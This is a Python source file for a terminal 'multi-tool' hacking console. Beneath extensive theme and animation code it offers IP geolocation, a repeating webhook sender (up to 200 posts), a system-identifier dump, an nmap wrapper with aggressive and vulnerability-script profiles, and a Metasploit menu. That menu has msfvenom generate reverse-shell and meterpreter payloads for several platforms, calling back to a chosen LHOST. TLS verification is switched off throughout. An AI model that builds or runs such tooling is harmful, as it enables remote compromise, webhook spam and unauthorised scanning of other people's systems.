"""foundation multi-tool console."""

import base64
import binascii
import concurrent.futures
import hashlib
import importlib.util
import json
import os
import platform
import random
import re
import shutil
import socket
import ssl
import struct
import subprocess
import sys
import tempfile
import time
import urllib.parse
import urllib.request
import uuid
import webbrowser

try:
    import tools_builder
except ImportError:
    tools_builder = None
import tools_advanced
import tools_discord
import tools_extra
import tools_hunt
import tools_osint
import tools_system
import tools_roblox
import tools_scan
import tools_utils
import apikeys

try:
    import requests
    HAVE_REQUESTS = True
    try:
        import urllib3
        urllib3.disable_warnings()
    except Exception:
        pass
except Exception:
    requests = None
    HAVE_REQUESTS = False

try:
    sys.stdout.reconfigure(encoding="utf-8")
    sys.stderr.reconfigure(encoding="utf-8")
except Exception:
    pass

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SETTINGS_PATH = os.path.join(BASE_DIR, "settings.json")
REPORT_DIR = os.path.join(BASE_DIR, "reports")

DEFAULT_SETTINGS = {
    "animations": True,
    "anim_style": "typewriter",
    "anim_speed": 1.0,
    "timeout": 8,
    "user_agent": "Mozilla/5.0 (X11; Linux x86_64) foundation/2.0",
    "theme": "lightblue",
    "custom_colors": {
        "pri": "#6ebeff", "sec": "#b2e4ff", "dim": "#7692ae",
        "ok": "#56e3aa", "warn": "#ffc860", "bad": "#ff6870",
    },
    "accent": "",
    "font": "default",
    "border": "double",
    "glyphs": "unicode",
    "density": "normal",
    "logo": "block",
    "color_mode": "truecolor",
    "show_clock": False,
    "show_build": True,
    "save_reports": True,
}

THEMES = {
    "lightblue": ((110, 190, 255), (178, 228, 255), (118, 146, 174), (86, 227, 170), (255, 200, 96), (255, 104, 112)),
    "bloody_red": ((220, 28, 40), (255, 96, 96), (150, 96, 96), (120, 230, 140), (255, 176, 32), (255, 60, 60)),
    "pitchblack": ((255, 255, 255), (186, 186, 186), (104, 104, 104), (255, 255, 255), (198, 198, 198), (255, 138, 138)),
    "matrix": ((0, 255, 110), (140, 255, 180), (58, 138, 86), (0, 255, 110), (198, 255, 120), (255, 90, 90)),
    "cyber": ((255, 62, 200), (120, 210, 255), (118, 96, 140), (94, 240, 190), (255, 190, 90), (255, 80, 110)),
    "amber": ((255, 176, 32), (255, 214, 130), (140, 114, 72), (150, 235, 170), (255, 176, 32), (255, 96, 84)),
    "nord": ((136, 192, 208), (216, 222, 233), (104, 120, 140), (163, 190, 140), (235, 203, 139), (191, 97, 106)),
    "dracula": ((189, 147, 249), (248, 248, 242), (98, 114, 164), (80, 250, 123), (241, 250, 140), (255, 85, 85)),
    "solarized": ((38, 139, 210), (147, 161, 161), (88, 110, 117), (133, 153, 0), (181, 137, 0), (220, 50, 47)),
    "forest": ((102, 187, 106), (200, 230, 201), (96, 125, 99), (129, 199, 132), (255, 213, 79), (229, 115, 115)),
    "violet": ((149, 117, 205), (209, 196, 233), (112, 96, 148), (128, 203, 196), (255, 183, 77), (239, 83, 80)),
    "ice": ((129, 212, 250), (224, 247, 250), (96, 125, 139), (128, 222, 234), (255, 213, 79), (255, 138, 128)),
    "ember": ((255, 138, 76), (255, 204, 188), (141, 110, 99), (174, 213, 129), (255, 202, 40), (255, 82, 82)),
    "tokyo": ((122, 162, 247), (198, 208, 245), (86, 95, 137), (158, 206, 106), (224, 175, 104), (247, 118, 142)),
    "synthwave": ((255, 113, 206), (114, 241, 255), (140, 90, 150), (114, 241, 255), (255, 190, 90), (255, 90, 120)),
    "gruvbox": ((250, 189, 47), (235, 219, 178), (146, 131, 116), (184, 187, 38), (250, 189, 47), (251, 73, 52)),
    "catppuccin": ((203, 166, 247), (205, 214, 244), (108, 112, 134), (166, 227, 161), (249, 226, 175), (243, 139, 168)),
    "monokai": ((249, 38, 114), (248, 248, 242), (117, 113, 94), (166, 226, 46), (230, 219, 116), (249, 38, 114)),
    "rose_pine": ((196, 167, 231), (224, 222, 244), (110, 106, 134), (156, 207, 216), (246, 193, 119), (235, 111, 146)),
    "ocean": ((86, 182, 194), (197, 233, 235), (94, 133, 136), (147, 224, 160), (255, 214, 102), (255, 120, 120)),
    "sunset": ((255, 138, 101), (255, 204, 188), (153, 110, 96), (174, 213, 129), (255, 202, 40), (255, 82, 82)),
    "neon": ((57, 255, 20), (180, 255, 180), (60, 140, 60), (57, 255, 20), (255, 255, 0), (255, 0, 80)),
    "mocha": ((201, 169, 146), (236, 224, 212), (140, 124, 112), (166, 204, 160), (230, 200, 140), (230, 120, 120)),
    "grayscale": ((220, 220, 220), (180, 180, 180), (120, 120, 120), (200, 200, 200), (200, 200, 200), (230, 120, 120)),
    "blood_moon": ((180, 20, 30), (240, 120, 120), (110, 60, 60), (120, 200, 140), (240, 170, 60), (255, 40, 40)),
}

FONTS = {
    "default": "",
    "bold": "1",
    "dim": "2",
    "italic": "3",
    "underline": "4",
    "bold_italic": "1;3",
    "reverse": "7",
}

BORDERS = {
    "double": ("╔", "╗", "╚", "╝", "═", "║"),
    "single": ("┌", "┐", "└", "┘", "─", "│"),
    "rounded": ("╭", "╮", "╰", "╯", "─", "│"),
    "heavy": ("┏", "┓", "┗", "┛", "━", "┃"),
    "ascii": ("+", "+", "+", "+", "-", "|"),
    "none": ("", "", "", "", "", ""),
}

GLYPHS = {
    "unicode": {"prompt": "└─▶", "bullet": "▌", "dot": "•", "ok": "✓", "hit": "◆"},
    "ascii": {"prompt": "-->", "bullet": ">", "dot": "*", "ok": "ok", "hit": ">"},
    "dots": {"prompt": "·>", "bullet": "■", "dot": "·", "ok": "✓", "hit": "●"},
    "minimal": {"prompt": "", "bullet": "", "dot": "", "ok": "+", "hit": "*"},
}

ANIM_STYLES = ("typewriter", "sweep", "glitch", "fade", "instant")
COLOR_MODES = ("truecolor", "256", "16")
DENSITIES = {"compact": 0, "normal": 1, "roomy": 2}
LOGOS = ("block", "slim", "none")

_ENUMS = {
    "anim_style": ANIM_STYLES,
    "font": tuple(FONTS),
    "border": tuple(BORDERS),
    "glyphs": tuple(GLYPHS),
    "density": tuple(DENSITIES),
    "logo": LOGOS,
    "color_mode": COLOR_MODES,
}


def is_hex(value):
    return isinstance(value, str) and re.fullmatch(r"#[0-9a-fA-F]{6}", value) is not None


def hex_to_rgb(value, fallback="#ffffff"):
    value = value if is_hex(value) else fallback
    if not is_hex(value):
        value = "#ffffff"
    return (int(value[1:3], 16), int(value[3:5], 16), int(value[5:7], 16))


def rgb_to_hex(rgb):
    return "#%02x%02x%02x" % (rgb[0], rgb[1], rgb[2])


def load_settings():
    cfg = dict(DEFAULT_SETTINGS)
    cfg["custom_colors"] = dict(DEFAULT_SETTINGS["custom_colors"])
    try:
        with open(SETTINGS_PATH, "r", encoding="utf-8") as fh:
            disk = json.load(fh)
        if isinstance(disk, dict):
            for k in DEFAULT_SETTINGS:
                if k in disk:
                    cfg[k] = disk[k]
    except Exception:
        pass
    if cfg.get("theme") not in THEMES and cfg.get("theme") != "custom":
        cfg["theme"] = DEFAULT_SETTINGS["theme"]
    for key, allowed in _ENUMS.items():
        if cfg.get(key) not in allowed:
            cfg[key] = DEFAULT_SETTINGS[key]
    colours = cfg.get("custom_colors")
    if not isinstance(colours, dict):
        colours = dict(DEFAULT_SETTINGS["custom_colors"])
    for slot, fallback in DEFAULT_SETTINGS["custom_colors"].items():
        if not is_hex(colours.get(slot)):
            colours[slot] = fallback
    cfg["custom_colors"] = colours
    if cfg.get("accent") and not is_hex(cfg.get("accent")):
        cfg["accent"] = ""
    return cfg

def save_settings(cfg):
    try:
        with open(SETTINGS_PATH, "w", encoding="utf-8") as fh:
            json.dump(cfg, fh, indent=2)
        return True
    except Exception as exc:
        print(f"  ! could not save settings: {exc}")
        return False

CFG = load_settings()
KEYS = apikeys.Keyring()

def _clamp(v):
    return max(0, min(255, int(v)))

def _blend(a, b, t):
    return (_clamp(a[0] + (b[0] - a[0]) * t),
            _clamp(a[1] + (b[1] - a[1]) * t),
            _clamp(a[2] + (b[2] - a[2]) * t))

def _ansi16(rgb):
    """Map an RGB triple onto the 8 basic ANSI foreground colours."""
    palette = ((0, 0, 0), (205, 49, 49), (13, 188, 121), (229, 229, 16),
               (36, 114, 200), (188, 63, 188), (17, 168, 205), (229, 229, 229))
    best, dist = 7, None
    for i, ref in enumerate(palette):
        d = sum((rgb[c] - ref[c]) ** 2 for c in range(3))
        if dist is None or d < dist:
            best, dist = i, d
    return 30 + best


def _xterm256(rgb):
    def ramp(v):
        return max(0, min(5, round((v / 255) * 5)))
    return 16 + 36 * ramp(rgb[0]) + 6 * ramp(rgb[1]) + ramp(rgb[2])


def theme_colors(name):
    """Resolve a theme name to its six RGB slots, honouring custom palettes."""
    if name == "custom":
        cols = CFG.get("custom_colors") or {}
        defaults = DEFAULT_SETTINGS["custom_colors"]
        return tuple(hex_to_rgb(cols.get(slot), defaults[slot])
                     for slot in ("pri", "sec", "dim", "ok", "warn", "bad"))
    return THEMES.get(name, THEMES["lightblue"])


def swatch(colors):
    return "".join(f"\033[38;2;{c[0]};{c[1]};{c[2]}m██\033[0m" for c in colors)


def glyph(name):
    table = GLYPHS.get(CFG.get("glyphs", "unicode"), GLYPHS["unicode"])
    return table.get(name, "")


def spacing():
    return DENSITIES.get(CFG.get("density", "normal"), 1)


def border_chars():
    return BORDERS.get(CFG.get("border", "double"), BORDERS["double"])


class Paint:
    def __init__(self):
        self.set(CFG.get("theme", "lightblue"))

    def set(self, theme):
        if theme == "custom" or theme not in THEMES:
            self.pri_rgb, self.sec_rgb, self.dim_rgb, self.ok_rgb, \
                self.warn_rgb, self.bad_rgb = theme_colors(theme)
            self.theme = theme
        else:
            self.theme = theme
            (self.pri_rgb, self.sec_rgb, self.dim_rgb,
             self.ok_rgb, self.warn_rgb, self.bad_rgb) = THEMES[theme]
        accent = CFG.get("accent") or ""
        if is_hex(accent):
            self.pri_rgb = hex_to_rgb(accent)

    def codes(self):
        return FONTS.get(CFG.get("font", "default"), "")

    def rgb(self, rgb, text, extra=""):
        codes = ";".join(c for c in (self.codes(), extra) if c)
        mode = CFG.get("color_mode", "truecolor")
        if mode == "16":
            head = f"\033[{_ansi16(rgb)}" + (f";{codes}" if codes else "") + "m"
        elif mode == "256":
            head = f"\033[38;5;{_xterm256(rgb)}" + (f";{codes}" if codes else "") + "m"
        else:
            head = f"\033[38;2;{rgb[0]};{rgb[1]};{rgb[2]}" + (f";{codes}" if codes else "") + "m"
        return head + text + "\033[0m"

    def pri(self, s):
        return self.rgb(self.pri_rgb, s)

    def sec(self, s):
        return self.rgb(self.sec_rgb, s)

    def dim(self, s):
        return self.rgb(self.dim_rgb, s)

    def ok(self, s):
        return self.rgb(self.ok_rgb, s)

    def warn(self, s):
        return self.rgb(self.warn_rgb, s)

    def bad(self, s):
        return self.rgb(self.bad_rgb, s)

    def bold(self, s):
        return f"\033[1m{s}\033[0m"

    def grad(self, s, invert=False):
        a, b = (self.sec_rgb, self.pri_rgb) if invert else (self.pri_rgb, self.sec_rgb)
        n = max(1, len(s) - 1)
        out = []
        for i, ch in enumerate(s):
            if ch == " ":
                out.append(ch)
                continue
            out.append(self.rgb(_blend(a, b, i / n), ch))
        return "".join(out)

P = Paint()

def enable_ansi():
    if os.name == "nt":
        os.system("")

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def term_width(default=78):
    try:
        return max(60, min(100, shutil.get_terminal_size().columns))
    except Exception:
        return default

def pause(msg="press enter"):
    try:
        input("\n  " + P.dim(f"[ {msg} ] "))
    except (EOFError, KeyboardInterrupt):
        pass

class BackException(Exception):
    """Raised when the operator types b/back at any prompt."""

def ask(prompt, default=None):
    suffix = P.dim(f" [{default}]") if default is not None else ""
    try:
        val = input("\n  " + P.sec("└─▶ ") + P.pri(prompt + ": ") + suffix + " ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return ""
    if val.strip().lower() == "b":
        print()
        raise BackException()
    if not val and default is not None:
        return str(default)
    return val

def sleep_t(d):
    if not CFG["animations"]:
        return
    time.sleep(max(0.0, d * float(CFG["anim_speed"])))

def anim_style():
    if not CFG.get("animations"):
        return "instant"
    return CFG.get("anim_style", "typewriter")

def type_out(text, color=None, delay=0.004):
    color = color or P.sec
    style = anim_style()
    if style == "instant":
        print(color(text))
        return
    da = delay * float(CFG["anim_speed"])
    if style == "sweep":
        for i in range(1, len(text) + 1):
            sys.stdout.write("\r" + color(text[:i]) + P.dim(text[i:i + 1]) + "   ")
            sys.stdout.flush()
            time.sleep(da)
        sys.stdout.write("\r" + color(text) + "   \n")
        sys.stdout.flush()
        return
    if style == "glitch":
        pool = "▓▒░<>/\\|#$%&"
        for frame in range(4):
            noise = "".join(random.choice(pool) if c != " " and frame < 3 else c
                            for c in text)
            sys.stdout.write("\r" + P.dim(noise))
            sys.stdout.flush()
            time.sleep(0.05 * float(CFG["anim_speed"]))
        sys.stdout.write("\r" + color(text) + "\n")
        sys.stdout.flush()
        return
    if style == "fade":
        for i in range(6):
            t = i / 5
            shade = _blend(P.dim_rgb, P.sec_rgb, t)
            sys.stdout.write("\r" + P.rgb(shade, text))
            sys.stdout.flush()
            time.sleep(0.035 * float(CFG["anim_speed"]))
        sys.stdout.write("\r" + color(text) + "\n")
        sys.stdout.flush()
        return
    for ch in text:
        sys.stdout.write(color(ch))
        sys.stdout.flush()
        time.sleep(da)
    print()

def loading(msg, seconds=0.9):
    style = anim_style()
    if style == "instant":
        print("  " + P.dim(f"[ {glyph('ok')} ] ") + msg)
        return
    spinners = {"typewriter": "◐◓◑◒", "sweep": "▁▃▄▅▆▇█▇▆▅▄▃",
                "glitch": "▖▘▝▗", "fade": "·∙•●•∙"}
    spinner = spinners.get(style, "◐◓◑◒")
    bar_len = 26
    start = time.time()
    frames = 0
    while True:
        elapsed = time.time() - start
        frac = min(1.0, elapsed / max(0.05, seconds))
        filled = int(bar_len * frac)
        cells = []
        for i in range(bar_len):
            if i < filled:
                cells.append(P.rgb(_blend(P.pri_rgb, P.sec_rgb, i / max(1, bar_len - 1)), "█"))
            else:
                cells.append(P.dim("░"))
        sp = P.pri(spinner[frames % len(spinner)])
        sys.stdout.write("\r  " + sp + " " + P.sec(msg.ljust(28)) + "[" + "".join(cells) + "]")
        sys.stdout.flush()
        frames += 1
        if frac >= 1.0:
            break
        time.sleep(0.03 * float(CFG["anim_speed"]))
    sys.stdout.write("\r  " + P.ok(glyph("ok")) + " " + P.dim(msg.ljust(28)) + "\n")
    sys.stdout.flush()

def launch_flash(label):
    style = anim_style()
    mark = glyph("hit")
    if style == "instant":
        print("  " + P.ok(glyph("ok") + " ") + P.sec(label))
        return
    if style == "glitch":
        pool = "▓▒░#@$%&*"
        for frame in range(5):
            noise = "".join(random.choice(pool) for _ in range(len(label)))
            sys.stdout.write("\r  " + P.pri(noise) + "  " + P.dim(label.upper()) + "        ")
            sys.stdout.flush()
            time.sleep(0.045 * float(CFG["anim_speed"]))
        sys.stdout.write("\r  " + P.ok(mark) + "  " + P.grad(label.upper(), invert=True) + "        \n")
        sys.stdout.flush()
        return
    if style == "fade":
        for i in range(5):
            shade = _blend(P.dim_rgb, P.pri_rgb, i / 4)
            sys.stdout.write("\r  " + P.rgb(shade, label.upper()) + "        ")
            sys.stdout.flush()
            time.sleep(0.04 * float(CFG["anim_speed"]))
        sys.stdout.write("\r  " + P.ok(mark) + "  " + P.grad(label.upper(), invert=True) + "        \n")
        sys.stdout.flush()
        return
    frames = ["▖", "▚", "▜", "▐", "█"]
    for f in frames:
        sys.stdout.write("\r  " + P.pri(f * 4) + "  " + P.grad(label.upper(), invert=True) + "        ")
        sys.stdout.flush()
        time.sleep(0.05 * float(CFG["anim_speed"]))
    sys.stdout.write("\r  " + P.ok(mark) + "  " + P.grad(label.upper(), invert=True) + "        \n")
    sys.stdout.flush()

def sweep_line():
    return

def section(title):
    rule = P.dim("─" * max(0, min(term_width(), 74) - 8 - len(title)))
    print("  " + P.pri(glyph("bullet")) + " " + P.bold(P.sec(title)) + " " + rule)

def kv(key, value, color=None):
    color = color or P.sec
    print("  " + P.dim(f"{key:<22}") + color(str(value)))

def note(text):
    print("  " + P.dim(text))

def finding(sev, title, detail=""):
    tags = {
        "CRIT": P.bad, "HIGH": P.bad, "MED": P.warn,
        "LOW": P.dim, "INFO": P.sec, "OK": P.ok,
    }
    tag = tags.get(sev, P.sec)(f"[{sev:<4}]")
    line = "  " + tag + " " + title
    if detail:
        line += P.dim(f"  ({detail})")
    print(line)

def hget(headers, name, default=""):
    if not headers:
        return default
    name_l = name.lower()
    for k, v in headers.items():
        if k.lower() == name_l:
            return v
    return default

class Response:
    __slots__ = ("status", "headers", "text", "url", "history", "cookies",
                 "error", "raw")

    def __init__(self, status=0, headers=None, text="", url="", history=None,
                 cookies=None, error="", raw=b""):
        self.status = status
        self.headers = headers or {}
        self.text = text or ""
        self.url = url
        self.history = history or []
        self.cookies = cookies or []
        self.error = error
        self.raw = raw or b""

class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

def http(url, cfg, method="GET", allow_redirects=True, extra_headers=None,
         timeout=None, body_limit=2_000_000, body=None):
    headers = {"User-Agent": cfg["user_agent"], "Accept": "*/*"}
    if extra_headers:
        headers.update(extra_headers)
    t = timeout if timeout is not None else cfg["timeout"]
    if HAVE_REQUESTS:
        try:
            r = requests.request(method.upper(), url, headers=headers, timeout=t,
                                 allow_redirects=allow_redirects, verify=False,
                                 data=body)
            try:
                cookies = list(r.raw.headers.getlist("Set-Cookie"))
            except Exception:
                cookies = []
            return Response(r.status_code, r.headers, r.text[:body_limit], r.url,
                            [h.url for h in r.history], cookies,
                            raw=r.content[:body_limit])
        except Exception as exc:
            return Response(error=str(exc))
    try:
        payload = body.encode("utf-8") if isinstance(body, str) else body
        req = urllib.request.Request(url, data=payload, headers=headers,
                                     method=method.upper())
        ctx = ssl._create_unverified_context()
        handlers = [urllib.request.HTTPSHandler(context=ctx)]
        if not allow_redirects:
            handlers.append(_NoRedirect())
        opener = urllib.request.build_opener(*handlers)
        try:
            with opener.open(req, timeout=t) as r:
                raw = r.read(body_limit)
                text = raw.decode("utf-8", "replace")
                return Response(r.status, dict(r.headers), text, r.geturl(), [],
                                raw=raw)
        except urllib.error.HTTPError as err:
            raw = err.read(body_limit) if err.fp else b""
            return Response(err.code, dict(err.headers), raw.decode("utf-8", "replace"),
                            err.geturl(), [], raw=raw)
    except Exception as exc:
        return Response(error=str(exc))

def normalize_url(raw):
    raw = raw.strip()
    if not raw:
        return ""
    if not re.match(r"^[a-zA-Z][a-zA-Z0-9+.-]*://", raw):
        raw = "http://" + raw
    return raw

def writable_dir(*parts):
    """Project folder when writable, temp fallback when permissions block us."""
    primary = os.path.join(BASE_DIR, *parts)
    try:
        os.makedirs(primary, exist_ok=True)
        probe = os.path.join(primary, ".nf_write_test")
        with open(probe, "w", encoding="utf-8") as fh:
            fh.write("")
        os.remove(probe)
        return primary
    except Exception:
        fallback = os.path.join(tempfile.gettempdir(), "foundation", *parts)
        os.makedirs(fallback, exist_ok=True)
        note(f"{os.path.join(*parts)} not writable — using {fallback}")
        return fallback

def save_report(name, data):
    if not CFG.get("save_reports"):
        return None
    if not ask("save this report? (y/n)", "n").lower().startswith("y"):
        note("report not saved")
        return None
    try:
        os.makedirs(REPORT_DIR, exist_ok=True)
        safe = re.sub(r"[^A-Za-z0-9._-]+", "_", name)[:48] or "report"
        path = os.path.join(REPORT_DIR, f"{safe}_{time.strftime('%Y%m%d-%H%M%S')}.json")
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(data, fh, indent=2, default=str)
        note(f"saved -> {path}")
        return path
    except Exception as exc:
        note(f"report save failed: {exc}")
        return None

def cmd_ip_lookup(cfg):
    target = ask("IP or hostname", "8.8.8.8")
    if not target:
        return
    loading("resolving target")
    if not re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target):
        try:
            target = socket.gethostbyname(target)
        except Exception as exc:
            finding("HIGH", "resolution failed", str(exc))
            return
    fields = ("status,message,country,countryCode,regionName,city,zip,lat,lon,"
              "timezone,isp,org,as,mobile,proxy,hosting,query")
    r = http(f"http://ip-api.com/json/{target}?fields={fields}", cfg)
    if r.error or not r.text:
        finding("HIGH", "lookup request failed", r.error)
        return
    try:
        data = json.loads(r.text)
    except Exception:
        finding("HIGH", "malformed response")
        return
    if data.get("status") != "success":
        finding("MED", "lookup refused", data.get("message", "unknown"))
        return
    section(f"geo / network — {data.get('query')}")
    for k in ("country", "countryCode", "regionName", "city", "zip", "lat", "lon",
              "timezone", "isp", "org", "as"):
        kv(k, data.get(k, "-"))
    flags = []
    if data.get("proxy"):
        flags.append("proxy/vpn")
    if data.get("hosting"):
        flags.append("hosting")
    if data.get("mobile"):
        flags.append("mobile")
    kv("flags", ", ".join(flags) if flags else "none", P.warn if flags else P.ok)
    save_report(f"ip_{target}", data)

def cmd_webhook(cfg):
    url = ask("webhook url")
    if not url:
        return
    message = ask("message", "foundation online")
    count = ask("send count", "1")
    delay = ask("delay between sends (s)", "0.5")
    try:
        count = max(1, min(200, int(count)))
        delay = max(0.0, float(delay))
    except ValueError:
        finding("MED", "bad count/delay")
        return
    payload = json.dumps({"content": message, "username": "foundation"}).encode()
    ok_n = 0
    for i in range(count):
        try:
            req = urllib.request.Request(
                url, data=payload,
                headers={"Content-Type": "application/json",
                         "User-Agent": cfg["user_agent"]},
                method="POST")
            with urllib.request.urlopen(req, timeout=cfg["timeout"]) as resp:
                code = resp.status
            ok_n += 1
            print("  " + P.ok(f"[{i + 1}/{count}]") + P.dim(f" status {code}"))
        except Exception as exc:
            print("  " + P.bad(f"[{i + 1}/{count}]") + P.dim(f" {exc}"))
        if i + 1 < count:
            time.sleep(delay)
    finding("OK" if ok_n == count else "MED", f"sent {ok_n}/{count}")

def _read_file(path, default=""):
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            return fh.read().strip()
    except Exception:
        return default

def cmd_hwid(cfg):
    loading("collecting system identity")
    section("system")
    kv("hostname", socket.gethostname())
    kv("platform", platform.platform())
    kv("machine", platform.machine())
    kv("processor", platform.processor() or "unknown")
    kv("python", platform.python_version())
    section("identifiers")
    mac = uuid.getnode()
    kv("mac", ":".join(f"{(mac >> b) & 0xFF:02x}" for b in range(40, -1, -8)))
    kv("node int", hex(mac))
    for label, path in (("machine-id", "/etc/machine-id"),
                        ("boot-id", "/proc/sys/kernel/random/boot_id"),
                        ("product uuid", "/sys/class/dmi/id/product_uuid"),
                        ("board serial", "/sys/class/dmi/id/board_serial")):
        val = _read_file(path, "-")
        kv(label, val)
    section("network identity")
    try:
        host_l = socket.gethostbyname_ex(socket.gethostname())[2]
        kv("local ipv4", ", ".join(host_l) if host_l else "-")
    except Exception:
        kv("local ipv4", "-")
    try:
        kv("cpu cores", os.cpu_count() or "-")
    except Exception:
        pass

TOP_PORTS = [
    21, 22, 23, 25, 53, 67, 68, 69, 80, 110, 111, 119, 123, 135, 137, 138,
    139, 143, 161, 162, 179, 389, 443, 445, 465, 500, 514, 515, 587, 631,
    636, 873, 990, 993, 995, 1080, 1433, 1521, 1723, 2049, 2082, 2083,
    2181, 2222, 2375, 2376, 3000, 3306, 3389, 3690, 4000, 4369, 4444,
    5000, 5432, 5555, 5601, 5672, 5900, 5984, 6000, 6379, 6443, 7001,
    7077, 8000, 8008, 8080, 8081, 8086, 8443, 8888, 9000, 9001, 9042,
    9090, 9100, 9200, 9300, 9418, 10000, 11211, 15672, 27017, 27018,
]

SERVICE_HINTS = {
    21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns", 80: "http",
    110: "pop3", 111: "rpcbind", 135: "msrpc", 139: "netbios", 143: "imap",
    161: "snmp", 389: "ldap", 443: "https", 445: "smb", 465: "smtps",
    514: "syslog", 587: "submission", 631: "ipp", 636: "ldaps", 873: "rsync",
    993: "imaps", 995: "pop3s", 1080: "socks", 1433: "mssql", 1521: "oracle",
    2049: "nfs", 2375: "docker", 3000: "dev http", 3306: "mysql",
    3389: "rdp", 5432: "postgres", 5672: "amqp", 5900: "vnc", 5984: "couchdb",
    6379: "redis", 6443: "k8s api", 8080: "http-alt", 8443: "https-alt",
    9200: "elasticsearch", 11211: "memcached", 27017: "mongodb",
}

def _port_probe(host, port, timeout):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    started = time.time()
    try:
        if sock.connect_ex((host, port)) != 0:
            return None
        ms = int((time.time() - started) * 1000)
        banner = ""
        try:
            sock.settimeout(max(0.4, timeout / 2))
            if port in (80, 8080, 8000, 8888, 3000):
                sock.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
            chunk = sock.recv(128)
            banner = chunk.decode("utf-8", "replace").splitlines()[0][:70] if chunk else ""
        except Exception:
            pass
        return (port, ms, banner)
    finally:
        try:
            sock.close()
        except Exception:
            pass

def py_port_scan(host, ports=None, workers=120, timeout=None):
    ports = ports or TOP_PORTS
    timeout = timeout or min(2.0, max(0.5, float(CFG["timeout"]) / 2))
    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as pool:
        futures = {pool.submit(_port_probe, host, p, timeout): p for p in ports}
        for fut in concurrent.futures.as_completed(futures):
            try:
                res = fut.result()
            except Exception:
                continue
            if res:
                open_ports.append(res)
    open_ports.sort(key=lambda x: x[0])
    return open_ports

def cmd_nmap(cfg):
    target = ask("target ip / host")
    if not target:
        return
    section("scan profile")
    print("  " + P.sec("[1]") + " top 100 ports")
    print("  " + P.sec("[2]") + " service/version  (-sV -Pn)")
    print("  " + P.sec("[3]") + " aggressive       (-A -T4)")
    print("  " + P.sec("[4]") + " vuln scripts     (--script vuln)")
    print("  " + P.sec("[5]") + " custom args")
    profile = ask("profile", "2")
    nmap = shutil.which("nmap")
    if nmap:
        base = [nmap]
        if profile == "1":
            base += ["-Pn", "--top-ports", "100", "-T4"]
        elif profile == "3":
            base += ["-A", "-T4", "-Pn"]
        elif profile == "4":
            base += ["-sV", "-Pn", "--script", "vuln", "-T4"]
        elif profile == "5":
            custom = ask("nmap args", "-sV -Pn")
            base += custom.split()
        else:
            base += ["-sV", "-Pn", "-T4"]
        if cfg["save_reports"]:
            try:
                os.makedirs(REPORT_DIR, exist_ok=True)
                outf = os.path.join(REPORT_DIR, f"nmap_{re.sub(r'[^A-Za-z0-9.-]', '_', target)}_{time.strftime('%Y%m%d-%H%M%S')}.txt")
                base += ["-oN", outf]
                note(f"output -> {outf}")
            except Exception:
                pass
        base.append(target)
        note(" ".join(base))
        loading("starting nmap")
        try:
            subprocess.call(base)
        except KeyboardInterrupt:
            note("nmap interrupted")
        except Exception as exc:
            finding("HIGH", "nmap failed", str(exc))
        return

    note("nmap not installed — using internal connect scanner")
    ports = TOP_PORTS
    if profile == "1":
        ports = TOP_PORTS[:100]
    elif profile == "4":
        note("payload scripts unavailable without nmap")
    loading(f"scanning {len(ports)} ports")
    try:
        results = py_port_scan(target, ports)
    except socket.gaierror:
        finding("HIGH", "target did not resolve")
        return
    if not results:
        finding("INFO", "no open ports found")
        return
    section(f"open ports — {target}")
    for port, ms, banner in results:
        name = SERVICE_HINTS.get(port, "unknown")
        print("  " + P.ok(f"{port:>5}/tcp") + "  " + P.sec(f"{name:<14}")
              + P.dim(f"{ms}ms") + (P.dim(f"  {banner}") if banner else ""))
    save_report(f"portscan_{target}", [
        {"port": p, "service": SERVICE_HINTS.get(p, "unknown"), "latency_ms": ms, "banner": b}
        for p, ms, b in results
    ])

PAYLOAD_PRESETS = [
    ("windows/x64/meterpreter/reverse_tcp", "exe", "shell.exe"),
    ("windows/x64/shell_reverse_tcp", "exe", "shell_rev.exe"),
    ("linux/x64/meterpreter/reverse_tcp", "elf", "shell.elf"),
    ("linux/x64/shell_reverse_tcp", "elf", "shell_rev.elf"),
    ("php/meterpreter/reverse_tcp", "raw", "shell.php"),
    ("python/meterpreter/reverse_tcp", "raw", "shell.py"),
    ("android/meterpreter/reverse_tcp", "raw", "shell.apk"),
    ("osx/x64/meterpreter_reverse_tcp", "macho", "shell.macho"),
]

def cmd_msf(cfg):
    section("metasploit")
    print("  " + P.sec("[1]") + " launch msfconsole")
    print("  " + P.sec("[2]") + " build payload (msfvenom)")
    print("  " + P.sec("[3]") + " check install")
    choice = ask("choice", "1")
    msf = shutil.which("msfconsole")
    venom = shutil.which("msfvenom")
    if choice == "3":
        kv("msfconsole", msf or "not found", P.ok if msf else P.bad)
        kv("msfvenom", venom or "not found", P.ok if venom else P.bad)
        if not msf:
            note("install: apt install metasploit-framework")
            note("or: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall")
        return
    if choice == "2":
        if not venom:
            finding("HIGH", "msfvenom not installed")
            note("apt install metasploit-framework")
            return
        section("payload presets")
        for i, (payload, fmt, default_name) in enumerate(PAYLOAD_PRESETS, 1):
            print("  " + P.sec(f"[{i}]") + f" {payload}  " + P.dim(f"-> {fmt}"))
        idx = ask("preset", "1")
        try:
            payload, fmt, default_name = PAYLOAD_PRESETS[int(idx) - 1]
        except Exception:
            finding("MED", "invalid preset")
            return
        lhost = ask("LHOST")
        lport = ask("LPORT", "4444")
        outfile = ask("output file", default_name)
        if not lhost:
            return
        cmd = [venom, "-p", payload, f"LHOST={lhost}", f"LPORT={lport}",
               "-f", fmt, "-o", outfile]
        note(" ".join(cmd))
        loading("compiling payload")
        try:
            subprocess.call(cmd)
            if os.path.exists(outfile):
                size = os.path.getsize(outfile)
                finding("OK", "payload written", f"{outfile}  {size} bytes")
            else:
                finding("MED", "msfvenom finished but no file found")
        except Exception as exc:
            finding("HIGH", "msfvenom failed", str(exc))
        return
    if not msf:
        finding("HIGH", "msfconsole not installed")
        note("apt install metasploit-framework")
        return
